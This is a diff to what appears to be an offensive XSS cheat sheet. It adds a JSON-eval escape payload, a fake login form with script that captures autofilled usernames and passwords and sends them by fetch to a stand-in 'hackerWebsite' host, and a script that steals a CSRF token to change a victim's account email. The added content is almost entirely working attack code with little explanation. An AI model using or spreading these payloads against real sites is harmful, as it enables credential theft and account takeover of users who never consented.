@@ -103,3 +103,54 @@ DOM BASED XSS
 * If eval is used to evaluate json data to convert it into object, we can used the following payload.
 ->  " }-alert(1)// 
 * This payload first escapes the Json and then comments out the rest.
+
+* The following payload can be used to steal autofill username & password.
+
+PAYLOAD: 
+    <form>
+        <input id="uname" type="text" name="username">
+        <input id="passwd" type="password" name="password">
+    </form>
+    <script>
+        var uname = document.getElementById('uname');
+        var passwd = document.getElementById('passwd');
+
+        uname.addEventListener('change', function(){
+            sendDataToServer(  uname.value );
+        });
+
+        passwd.addEventListener('change', function(){
+            sendDataToServer( passwd.value );
+        });
+
+        function sendDataToServer(data) {
+            const queryParams = new URLSearchParams(data).toString();
+            const url = `https://hackerWebsite?x=${queryParams}`;
+
+            fetch(url, {
+                method: 'GET'
+            })
+            .then(response => response.json())
+            .then(result => {
+                //console.log('Server response:', result);
+            })
+            .catch(error => {
+                //console.error('Error sending data:', error);
+            });
+            }
+    </script>
+
+* We can also use XSS to steal CSRF tokens and send request with the stolen cookie.
+-> 
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
